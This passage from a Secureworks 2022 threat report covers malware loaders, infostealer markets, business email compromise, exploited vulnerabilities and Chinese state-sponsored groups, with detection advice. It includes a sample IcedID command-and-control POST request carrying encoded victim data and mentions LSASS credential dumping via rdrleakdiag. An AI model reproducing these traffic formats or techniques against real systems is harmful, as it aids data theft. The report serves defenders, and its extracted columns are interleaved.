Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

The Conti Leaks may shed some light on the decision to abandon 

Distribution for IcedID also changed during 2021, to distribute ISO files 

TrickBot, as they include conversations about TrickBot's declining utility 

containing Windows shortcut (LNK) files that execute a colocated 

and BazarLoader's increasing maturity. In a sign of the speed with 

DLL file containing the IcedID payload. In a March 2022 intrusion, an 

which the threat landscape can change, by April 2022 a new loader 

attacker compromised an internet\-facing Microsoft Exchange Server 

called Bumblebee was being used in Conti and Diavol ransomware 

via the ProxyShell vulnerability and used access to the compromised 

attacks in preference to BazarLoader. However, TrickBot's design 

server to send internal phishing emails containing hijacked email 

means GOLD BLACKBURN retains the capability to re\-enable the C2 

threads and an attached IcedID payload. This technique of using 

infrastructure and recapture existing bots if the group chooses to. 

compromised email servers to send internal phishing emails is likely 

There were lulls in IcedID activity between July and November 

bypassing security controls that warn users by tagging emails that 

2021, and between February and May 2022, but activity levels have 

originate externally. 

an effort to ensure that emails appear to come from a trusted sender, 

continued to increase since May 2022\. In 2021 the operators of 

IcedID, GOLD SWATHMORE30, reworked the malware’s networking 

functionality to include Base64\-encoded information about the victim 

system in the HTTP Cookie and Authorization header (figure 11\).

POST /news/1/255/0 HTTP/1\.1
Host: coolbearblunts.com
Connection: Keep\-Alive
Content\-Type: application/octet\-stream
Cookie: session\=MDowOjA6MjIxMzQ6MA\=\=
Authorization: Basic MzU2MDE4MjYwMDOxMDg2NDczMzAyOjEwNzo2Njoy
Content\-Length: 416

JjE0NDQ1MTcwPUE0QkI2RENENEExMyYyMDg0NzgwOT01NDQ1MDA1NDU1MDA1NTM1MDA1NEI1MDA1NTQ1MDA1 
NEY1MDAINTAIMDA]MkQIMDAINTIIMDA]MzMIMDAINTUIMDAIMZEIMDA]MzkIMDAIMzMIMDAmMzMONTk5NTg9 
JTU3JTAwJTRGJTAwJTUyJTAwJTRCJTAwJTQ3JTAwJTUyJTAwJTRGJTAwJTU1JTAwJTUwJTAwJjUzOTU4OTQ5 
PTMmMTg2NzkwOTM9MCY1NTA5MDkyNz@xMC4wLjE5MDQ×LjAuNjQuMS400CYONDMANTY10D01NKE1MDAINjM1 
MDAINzIlMDAINjUlMDAINkUlMDAINzMIMDAINjgIMDAINjEIMDAINzcIMDAmNTE@MTgyMTA9ODE5Mg\=\=

Figure 11\. IcedID HTTP POST request with encoded victim information. (Source: Secureworks)

2022 State of the Threat: A Year in Review

20

 
• 

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Figure 12\. Taegis XDR detection for IcedID malware. (Source: Secureworks)

2022 State of the Threat: A Year in Review

21

 
01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

New on the Scene

PureCrypter

PureCrypter is a fully featured malware builder and loader advertised 

for sale since March 2021 at $59 USD for one month and $249 for 

lifetime use. It is a .NET executable obfuscated with SmartAssembly. 

It is widely used to drop payloads for cybercriminal ends. In addition, 

CTU researchers assess with moderate confidence that the developers 

of the WhisperGate32 file wiper that was deployed against targets in 

Ukraine prior to the Russian invasion used PureCrypter to generate the 

.NET code in both the loader and the initial payload. 

There have been a number of new loaders that have emerged during 

the reporting period, and in some cases disappeared again. CTU 

researchers assess that the groups operating these loaders may move 

away from the complex, fully\-featured botnets that evolved from the 

early banking trojans towards more lightweight loaders that are easier 

to develop and maintain. That shift is likely enabled by increased use 

of fully featured and actively maintained post\-exploitation tools such 

as Cobalt Strike. The role of the loader is simply to achieve an initial 

access point, perhaps perform some basic reconnaissance such as 

checking that the infected host is joined to an Active Directory domain, 

and then retrieve and execute the post\-exploitation tool. 

Bumblebee

CTU researchers' analysis of Bumblebee reveals rapid development and 

numerous active campaigns. Multiple threat actors now appear to have 

moved to using Bumblebee to drop payloads that include Cobalt Strike, 

Sliver31, and Meterpreter in order to deliver ransomware.

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Figure 13\. PureCrypt and associated tool pricing at https://purecoder.sellix.io/ 
(Source: Secureworks)

2022 State of the Threat: A Year in Review

22

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

SquirrelWaffle

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

SquirrelWaffle loader was first detected in September 2021, delivering 

Qakbot and Cobalt Strike. Initially, some third\-party commentators 

characterized it as an heir to Qakbot, Emotet, or IcedID. However, 

by early November, SquirrelWaffle's infrastructure had been disabled 

and the loader was not observed again in active distribution. CTU 

researchers saw only a small number of SquirrelWaffle infections 

across customer environments (figure 14\).

Figure 14\. iSensor IDS detection for SquirrelWaffle HTTP POST request that uses 
padding and a hardcoded XOR key. (Source: Secureworks)

2022 State of the Threat: A Year in Review

23

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Bringing the Victim to You: 
Drive\-By\-Download as an 
Alternative Distribution Method

'Drive\-by\-downloads' continue to be a popular alternative to phishing\-

GOLD ZODIAC uses search engine optimization (SEO) poisoning, 

based malware distribution. Notable examples include the prolific 

layers of public blog posts, and a complex array of compromised 

SocGholish malware framework, operated by GOLD PRELUDE33, and 

WordPress sites to drive high\-ranking Google search results to 

the Gootloader JavaScript\-based loader distributed by the GOLD 

deliver Gootloader. Professionals who visit these infected sites to 

ZODIAC34 threat group. A user visits a compromised website that 

download model legal agreements or other documents are tricked 

triages the visitor and serves up a series of redirects that ultimately 

into downloading GootLoader, leading to the download of Cobalt 

deliver malware.

Strike as a precursor to ransomware.

User follows poisoned,
high ranking Google 
search result to a 
GOLD ZODIAC
compromised
Wordpress site

When executed, the 
loader sends system 
information to a hard 
coded C2 domain, 
which checks whether 
the machine is Active 
Directory joined

If yes, the C2 server 
returns a payload and 
moves to the next 
stage of the infection

Code injected into
compromised site 
checks the user has 
not visited before and 
that the browser is on 
allow list 

Download link redirects 
through a series of
compromised sites 
to deliver a .zip ﬁle 
containing the
Gootloader Javascript 
based loader

Gootloader creates a
scheduled task for
presistence, stuffs 
multiple registry keys, 
with encoded payloads

If either is false, the 
user is presented a 
generic, non\-malicious 
web page

If both are true, the user 
is presented the hallmark 
Gootloader Q\&A forum 
page containing a direct 
download link matching 
the original search term

The scheduled task 
decodes and executes 
the payloads

Figure 15\. Gootloader process flow. (Source: Secureworks)

2022 State of the Threat: A Year in Review

24

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Figure 16\. Compromised WordPress site. (Source: Secureworks)

Infostealers: A Thriving Market

Loaders are one way of gaining access to an environment. Another 

is using credentials obtained by infostealers, or 'stealers'. Analysis of 

the sale of 'logs' (collections of stolen data) on underground forums 

Conclusion

shows that stealers are becoming increasingly popular. On a single day 

The Secureworks 
View of the Threat

in June 2022, over two million logs were offered for sale on a single 

underground forum (figure 17\).

The three main stealer markets are:

• Genesis Market 

• Russian Market—likely tied to the now defunct 

Amigos market

• 2easy—claims to be the largest stealer 
market, but Russian Market and Genesis 
appear to host more logs.

849K
Vidar

126K
Raccoon

49K
Azorult

1\.7M
RedLine

94K
Taurus

2,884,269
Total Count

Figure 17\. Logs from popular stealers for sale on Russian Market underground 
forum on June 2, 2022\. (Source: Secureworks)

2022 State of the Threat: A Year in Review

25

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Genesis

Russian Market

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Active since 2018, Genesis is an online marketplace for stolen account 

Considered to be the largest active stealer market, Russian Market sells 

data, offering custom bot software that allows customers to clone 

logs from multiple vendors. It is possible to search by stealer name, 

their victims' browsers, including cookies, usernames, and passwords. 

system, country, state, city, zip code, ISP, email address, vendor, or 

When a criminal buys an identity on the market, they buy access to the 

domain. Data on sale on June 2, 2022, originated from 226 different 

bot on the victim's computer, making it easy to hijack victims' online 

countries, and 510 different victim operating system versions. Russian 

accounts. Access to the site, which operates on the dark web and the 

Market also sells credit card information, RDP and SSH credentials, and 

open internet, is via invitation. It is possible to search the logs by bot 

PayPal accounts.

name, location, or domain. 

Figure 18\. Listings on Genesis Market (Source: Secureworks)

Figure 19\. Russian Market user interface (Source: Secureworks)

2022 State of the Threat: A Year in Review

26

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

2easy

CTU researchers have seen an increase in the sale of network access 

sourced from credentials acquired by information stealers. Initial 

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2easy, which was first advertised in 2020, is a relatively new market 

access brokers comb through the data to find credentials for remote 

compared to Genesis and Russian Market. It's less open than the 

access solutions at potentially high\-value targets and then sell the 

Russian Market and requires an invitation code to join. Users can 

access individually, usually at auction, for a large sum. Access to low\-

search by country, seller, creation date, price, or domain.

profile targets is sold in bulk in packages of as many as hundreds of 

Figure 20\. Search options on 2easy (Source: Secureworks)

thousands of compromised accounts at once, mostly for organizations 

located in the E.U., U.K., and U.S.

There is a plethora of stealers for sale on underground forums but 

some of the major ones include RedLine, Vidar, Raccoon, Taurus, and 

AZORult. 

RedLine harvests browser information such as credit card data 

and saved credentials. It also gathers system information, and more 

recent versions can steal cryptocurrency wallet data. In July 2021, 

CTU researchers saw RedLine in use in a campaign employing cloned 

websites with a travel or hotel theme to fool victims into downloading 

an executable with RedLine as the ultimate payload. Threat actors have 

also distributed RedLine via trojanized installers for messaging software 

such as Signal. 

2022 State of the Threat: A Year in Review

27

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Vidar, written in C\+\+, has typical stealer functionality combined with 

an unusual method of obtaining C2 IP address information by creating 

fake user profiles on social networks to post C2 IP addresses (figure 

22\). In 2021, it used gaming platforms for the same purpose. CTU 

researchers have seen Vidar dropping the popular SystemBC proxy 

malware on infected systems before self\-deleting. In February 2022, 

Vidar was available to rent at prices between $130 for seven days and 

$750 for 90 days.

Figure 21\. Cloned website containing a security warning and download prompt 
for Redline payload. (Source: Secureworks)

Figure 22\. Vidar using Mastodon social network for C2\. (Source: Secureworks)

2022 State of the Threat: A Year in Review

28

Raccoon stealer collects passwords, cookies, and browser autofill 

Taurus is a stealer thought to have been developed by the 

form data as well as system information and cryptocurrency wallets. In 

threat actor behind the Predator the Thief malware. Offered for 

February 2022, it was being advertised for between $75 for seven days 

sale on underground forums, the Taurus developer claims that it 

of use and $375 for two months. 

can steal passwords, cookies, and autofill forms along with the 

The group responsible for Racoon announced35 in March 2022 that 

system configuration and software data, as well as some popular 

they were suspending development after one of its developers was 

cryptocurrency wallets and commonly used FTP and email client 

history of Chromium\- and Gecko\-based browsers. It can also steal 

killed during the Russian invasion of Ukraine. However, version 2 of 

credentials. 

Raccoon launched in May, and in June CTU researchers observed logs 

being offered for sale on Russian Market. 

AZORult steals passwords, cookies, cryptowallets, and files. Once 

one of the most prolific stealers, it is no longer in active development 

and is available to users for free. Its last version update was likely in 

December 2018\.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

29

 
01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Business Email Compromise

While it does not capture the public attention in quite the same way, 

Defending against BEC requires a layered approach:

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

from a financial loss perspective business email compromise (BEC) 

continues to rank alongside ransomware as a major threat. According 

to the FBI, reported losses between October 2013 and December 

2021 were over $43 billion USD36, with adjusted losses of $2\.4 

billion USD37 in 2021 alone, dwarfing the reported losses attributed to 

ransomware. 

There are undoubtedly some issues around reporting that mean that 

ransomware losses have been significantly underrepresented, but 

Secureworks incident response data corroborates the FBI’s findings 

around the prevalence of BEC. 

In the first half of 2022, Secureworks incident responders saw a 27% 

year\-on\-year increase compared to the same period for 2021\. These 

incidents continue to display simple but effective techniques that 

are largely unchanged from those reported in the 2021 State of the 

Threat Report. In most cases, a user at the victim organization was 

compromised through a phishing email that directed the user to a 

credential\-stealing site controlled by the threat actor. In a few cases, 

the threat actors were able to bypass multi\-factor authentication by 

tricking the user or by enrolling their own device (see page 63\). 

Threat actors have realized that organizations implement controls to 

flag external emails as potentially suspicious, and in response are often 

leveraging compromised accounts to send internal phishing emails as 

these are more likely to be trusted, especially where the compromised 

account belongs to a senior executive at the company. 

• Training to help users understand what BEC is, how it 

typically happens, and how to spot it.

• Financial controls to ensure that any deviation from 
established payment routes is a multi\-step process to 

ensure that suspicious changes to bank details or purchase 

requests are flagged.

• Email controls including MFA, rules to alert on sequential 
logins from unusual locations and email rule changes, and 

web proxy and DNS controls to identify connections to 

suspicious domains that could be hosting a credential\-

harvesting site.

• Response training so that the organization knows how 

to react if a BEC incident is discovered. Incident response 

planning should include arrangements for reporting to law 

enforcement and financial institutions, as time is a critical 

factor when attempting to recover stolen funds. 

2022 State of the Threat: A Year in Review

30

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

05
Exploitation of Remote Services 
is Now the Most Common 
Access Vector

Exploitation of vulnerabilities in internet\-facing systems became the 

by the need to generate profit or keep their tools relevant—to 

most common initial access vector (IAV) observed in Secureworks 

promptly implement new exploit code. Debates about responsible 

incident response engagements during 2021\. It remained that way 

disclosure often miss the fact that even where a patch exists, the 

in the first part of 2022, replacing 2020's top IAV of credential\- 

process of patching a vulnerability in an enterprise environment is far 

based attacks.

more complex and slower than the process for threat actors or OST 

developers of weaponizing publicly available exploit code.

Threat actors continue to rapidly weaponize new vulnerabilities, while 

developers of offensive security tools (OSTs) are also incentivized— 

50

40

30

20

10

0

Third Party

Vulnerabilities in 
Internet\-Facing 
Devices

Credentials

Malicious Emails

Q1 
2020

Q2 
2020

Q3 
2020

Q4 
2020

Q1 
2021

Q2 
2021

Q3 
2021

Q4 
2021

Figure 23\. Change in observed initial access vector over time. (Source: Secureworks)

2022 State of the Threat: A Year in Review

31

When Does a Vulnerability 
Become a Threat?

Whenever a new vulnerability becomes publicly known, organizations 

are forced to make rapid decisions about how they prioritize mitigating 

it. Some vulnerabilities essentially prioritize themselves: a remote code 

execution that is trivial to exploit and impacts internet\-facing software 

used globally is likely to demand a very rapid response. But in other 

cases, the decision might be less clear\-cut.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Prioritizing Vulnerabilities: 
Questions to Ask

• Do we use the impacted software and versions? Asset 
management is a critical component of any good 

vulnerability management strategy.

• How feasible is exploitation in a production environment, 

as opposed to in a research lab? Is a specific configuration 

needed, and what other dependencies might successful 

exploitation rely on? 

• What is the impact if it is exploited? The ability to arbitrarily 
execute code remotely or crash sensitive systems is likely to 

be of greatest concern.

• 

Is there evidence of active exploitation? If attackers are 

using it, patching will likely become more urgent. And if 

proof of concept exploit code has been published, then 

even if threat actors aren't currently exploiting it, they 

probably soon will be.

• Does a patch exist? If not, what other mitigations exist? 

How easy is the patch or mitigation to apply? 

• How business critical are the assets that could be 

impacted? What are the consequences of them being 

exploited? Conversely, what is the impact of taking the 

assets offline to patch?

2022 State of the Threat: A Year in Review

32

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Focusing on What Matters

Don't Spring to Conclusions

New vulnerabilities often come with a lot of accompanying hype, 

On March 29, 2022, rumors began circulating about a zero\-day 

which can distract from understanding the real risk. Social media 

remote code execution (RCE) vulnerability in the Spring Framework 

often exacerbates this, acting as an echo chamber to perpetuate 

Core component. Early on March 30, a Twitter persona shared a link 

unsubstantiated information. In contrast, there are useful resources 

to a proof\-of\-concept exploit but quickly deleted their account. The 

such as CISA's Known Exploited Vulnerabilities (KEV) catalog38 that 

vulnerability, CVE\-2022\-22965, received a severity rating of 9\.8 out of 

can help organizations prioritize based on evidence of observed 

10 and was soon dubbed 'Spring4Shell'. 

exploitation. Similarly, Secureworks Vulnerability Detection 

and Response39 (VDR) platform helps organizations make better 

Like the Log4Shell vulnerability (CVE\-2021\-44228\) that emerged in 

prioritization decisions by combining global context about ease and 

December 2021, Spring4Shell appeared to have the potential to impact 

impact of exploitation and threat intelligence about active exploitation 

many organizations. Spring is considered40 one of the world's most 

with local context about the assets operated by the customer. 

popular Java application development frameworks, meaning that many 

Java applications were potentially affected. Secureworks published a 

Between June 2021 and June 2022, according to VDR data, 13% of 

Security Advisory containing a measured warning about the availability 

vulnerabilities carrying CVSSv2 scores rating them as critical (higher 

of exploit code, recommending that customers identify applications 

than 7\) had at least one exploit available on ExploitDB, Packetstorm or 

in their environment that could be affected and monitor Spring's 

GitHub. In contrast, vulnerabilities flagged up as critical using VDR's 

communication, but noting that CTU researchers were yet to see any 

various scoring criteria were two and a half times more likely to have 

post\-exploit activity.

an associated publicly available exploit. This multiplier rose to over 

three in the case of the subset of those critical vulnerabilities that CTU 

researchers had observed being exploited in the wild.

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

33

In the end, the impact of Spring4Shell appears to have been very 

limited. Certain conditions41 had to be met for successful exploitation 

and a default implementation was not vulnerable. As of this report, 

CTU researchers have seen very few examples of successful 

exploitation. The same was true to a lesser extent for Log4Shell, 

which was undoubtedly more serious but also turned out to be 

less easy to exploit42 than originally feared. CTU researchers saw 

exploitation of Log4Shell against VMware Horizon and Tableau servers 

in some customer environments, and a June 2022 CISA/GCGCYBER 

advisory43 noted that exploitation of this vulnerability continues. But 

Detect the Vulnerability, 
Not the Exploit

CVE\-2022\-1388, a pre\-authentication vulnerability in the BIG\-IP 

load balancing and security suite that gives an unauthenticated 

attacker remote code execution capability, was made public 

and patched on Wednesday, May 4, 2022\. Over the weekend 

of May 7 and 8, both Horizon3 and Positive Technologies 
created44 exploits. On May 9, exploit code was published on 
GitHub. On May 10, reports were published that some attackers 

were using Linux root privileges gained through exploitation of 

this vulnerability to delete almost every file on compromised 

CTU researchers did not observe mass exploitation of the vulnerability 

devices, including vital configuration files. 

resulting in successful follow\-on code execution. 

As with all new vulnerabilities, CTU researchers analyzed 

CVE\-2022\-1388 and deployed a network signature to detect 

exploitation traffic. There was clear evidence of a spike in 

exploit traffic on May 11\. However, interestingly, this same exploit 

traffic was being caught by a signature CTU researchers wrote 

on March 18, 2021, for CVE\-2021\-22986, a similar vulnerability 

in BIG\-IP that allowed undisclosed requests to bypass iControl 

REST authentication. In catching the newer exploit, the older 
signature demonstrated the value of intelligence\-driven controls 

enabled by well\-crafted detection logic.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

34

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Figure 24\. IDS detections – CVE\-2021\-22986 and CVE\-2022\-1388\. (Source: Secureworks)

2022 State of the Threat: A Year in Review

35

05,00010,00015,00020,00025,00030,00035,00040,000Jan\-21Feb\-21Mar\-21Apr\-21May\-21Jun\-21Jul\-21Aug\-21Sep\-21Oct\-21Nov\-21Dec\-21Jan\-22Feb\-22Mar\-22Apr\-22May\-22Jun\-22Jul\-2206
Hostile 
Government\-
Sponsored Actor 
Activity Shows a 
Regional Focus

Government\-sponsored threat group activity continues to be driven by 

geopolitical considerations. For Russia, that has primarily meant Ukraine 

and other near neighbors. Both Iran and China have largely maintained 

their traditional geographical points of focus, although CTU researchers 

have observed some targeting of organizations in Europe and North 

America. North Korea, in contrast, has concentrated on revenue 

generation, targeting a variety of countries.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

36

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

China 

A Strategic Threat

Main Motivations: 

Espionage

Intellectual Property

Theft

2022 State of the Threat: A Year in Review

37

 
 
 
01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

China

Chinese government\-sponsored groups are some of the most prolific 

and well\-resourced threats facing organizations worldwide. The 

Hiding in the Noise

Chinese government uses its cyber capabilities, typically operated, or 

In the last twelve months there has been a continuing trend of Chinese 

tasked by the Ministry of State Security (MSS) or People’s Liberation 

threat groups conducting harder\-to\-attribute operations against 

Army (PLA) to gather political and military intelligence, steal intellectual 

a more select range of targets. However, those targeted attacks 

property, and spy on individuals of interest. 

are often conducted to appear opportunistic, for example by using 

techniques also favored by cybercriminal threats such as ransomware 

China’s 14th 5\-year plan (2021\-2025\) was formally adopted in March 

groups. One example of this is exploitation of remote services for initial 

2021 and, along with other initiatives such as Made in China 2025, 

access.

emphasizes the need for modernization and innovation in key industrial 

sectors. CTU researchers have observed Chinese threat groups target 

Chinese government\-sponsored threat groups remain quick to respond 

organizations in most of those key industries, as well as supporting 

when new exploit code is available for internet\-facing applications 

organizations such as legal firms, as China continues to leverage its 

such as Microsoft Exchange. Over the past year, they have been 

offensive cyber capabilities in the pursuit of first regional and then 

reported as exploiting zero\-day vulnerabilities against SolarWinds 

global hegemony. 

Serv\-U FTP software45 and ZOHO ManageEngine ADSelfService46, 

as well as an elevation of privilege zero\-day in the Microsoft Win32k 

Chinese groups have also undertaken a degree of tasking in relation 

kernel driver47\.

to the war in Ukraine, monitoring both Russia and Ukraine. Use of 

HeaderTip malware against Ukraine has been attributed by third\-party 

Their use of 'living off the land' techniques and common tooling, 

researchers to Chinese threat group Scarab.

such as Cobalt Strike also complicates attribution of Chinese threat 

group activity. In one intrusion in mid\-2022, CTU researchers saw a 

probable Chinese threat actor using the built\-in Windows executable 

rdrleakdiag.exe to dump the Local Security Authority Subsystem 

Service (LSASS) process memory for credential extraction (see figure 

25\). Rdrleakdiag.exe is a legitimate Microsoft resource leak diagnostic 

tool that can be abused by threat actors.

2022 State of the Threat: A Year in Review

38

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Figure 25\. LSASS process dumped using rdrleakdiag (Source: Secureworks)

This deliberate use of techniques that blur the line separating 

opportunistic, financially motivated cybercrime and targeted espionage 

has been taken further by at least one probable government\-

sponsored Chinese threat group, BRONZE STARLIGHT48\. The group 

has been associated with intrusions involving the deployment of 

LockFile, AtomSilo, Rook, Night Sky, and Pandora ransomware variants. 

BRONZE STARLIGHT has been observed using the HUI Loader malware 

during these attacks. HUI Loader is executed via DLL side\-loading to 

decode a third file containing an encrypted payload, usually Cobalt 

Strike, that is also deployed to the compromised host. The /rest/2/

meetings HTTP POST URI shown in figure 26 is common across 

BRONZE STARLIGHT activity but CTU researchers have not seen it 

anywhere else.

It would be easy to mistake BRONZE STARLIGHT activity for routine 

cybercrime. However, HUI Loader was also used by the A41APT 

group49 against an organization in Japan to load the SodaMaster 

remote access trojan (RAT). CTU researchers associate A41APT with 

the BRONZE RIVERSIDE50 (also known as APT10\) espionage group 

based on overlapping tactics, techniques, and procedures (TTPs). 

This and other tool overlaps suggest a close relationship between the 

BRONZE RIVERSIDE and BRONZE STARLIGHT groups. The victimology, 

short lifespan of each ransomware family, and access to malware 

used by government\-sponsored threat groups suggest that BRONZE 

STARLIGHT's main motivation may be intellectual property theft or 

cyber espionage, rather than financial gain. The ransomware could 

be a deliberate tactic to cover their tracks and distract incident 

responders from identifying the threat actors’ true intent, reducing the 

likelihood of attributing the activity to China.

Figure 26\. BRONZE STARLIGHT Cobalt Strike payload configuration information. 
(Source: Secureworks)

2022 State of the Threat: A Year in Review

39

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

New Techniques, 
Greater Sophistication

Not all Chinese threat group activity aims to blend in with general 

internet noise. The sophistication levels displayed by certain Chinese 

threat groups over the past year has increased, likely in response 

to better detection capability in target environments and to public 

attribution of activity, for example, the formal attribution51 to China 

by The White House of malicious cyber activity. In particular, CTU 

researchers have observed new loading techniques and more 

obfuscation of code and infrastructure. 

 For example, in one attack on a Japanese organization, BRONZE 

